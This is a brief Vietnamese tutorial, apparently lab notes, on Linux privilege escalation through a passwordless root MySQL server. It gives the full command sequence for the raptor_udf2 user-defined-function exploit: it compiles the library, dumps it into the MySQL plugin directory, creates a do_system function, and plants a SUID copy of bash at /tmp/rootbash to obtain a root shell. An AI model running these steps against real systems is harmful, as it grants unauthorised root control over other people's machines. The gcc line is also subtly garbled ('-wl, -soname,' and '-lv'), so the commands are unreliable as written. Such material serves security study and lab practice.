# Các cách tân công leo thang đặc quyền (Privilege Escalation)
---------------
## Service Exploits (Khai thác dịch vụ
* MySQL server đang chạy với quyền root nhưng root user lại không được cấp pass. Ta có thể khai thác User Defined Functions (UDFs) để chạy command với quyền root thông qua MySQL
  - Đầu tiên ta cd đến folder của MySQL UDFs: ```cd /home/<username>/tools/mysql-udf```
  - Thực thi code xâm nhập raptor_udf2.c:

        gcc -g -c raptor_udf2.c -fPIC
        gcc -g -shared -wl, -soname, raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lv
  - Kết nối tới MySQL với quyền root (mật khẩu rỗng):
 
        mysql -u root
  - Thực thi những câu lệnh sau để MySQL shell để tạo một UDFs:
 
        use mysql;
        create table foo(line blob);
        insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
        select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
        create function do_system returns integer soname 'raptor_udf2.so';
  - Dùng hàm để copy /bin/bash với /tmp/rootbash và cấp quyền SUID

        select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
  - Thoát shell MySQL (dùng ```exit``` hoặc ```\q```) và chạy lệnh với option ```-p``` để chạy shell với đặc quyền root

        /tmp/rootbash -p
  - Nhớ xoá ```/tmp/rootbash``` và thoát khỏi root shell trước khi tiếp tục

        rm /tmp/rootbash
        exit
    
